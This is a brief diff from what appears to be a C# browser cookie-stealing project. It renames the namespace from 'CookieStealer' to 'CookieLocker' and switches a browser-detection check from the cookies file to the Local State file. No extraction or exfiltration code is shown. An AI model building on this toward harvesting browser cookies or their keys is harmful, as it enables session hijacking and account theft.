@@ -1,4 +1,4 @@
-﻿namespace CookieStealer.Utilities;
+﻿namespace CookieLocker.Utilities;
 
 public class BrowserInfo
 {
@@ -101,7 +101,7 @@ public class BrowserData
         }
 
         foreach (var browser in Browsers
-                     .Where(browser => Path.Exists(browser.Value.PathToCookiesFile)))
+                     .Where(browser => Path.Exists(browser.Value.PathToLocalState)))
             browser.Value.Exists = true;
 
         foreach (var browser in Browsers)
